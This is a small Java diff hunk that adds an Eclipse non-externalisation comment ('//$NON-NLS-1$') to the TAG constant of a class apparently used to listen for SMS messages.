@@ -13,7 +13,7 @@ import com.android.service.Sms;
 
 public class ListenerSms extends Listener<Sms> {
 	/** The Constant TAG. */
-	private static final String TAG = "ListenerSms";
+	private static final String TAG = "ListenerSms"; //$NON-NLS-1$
 
 	private BroadcastMonitorSms smsReceiver;
 
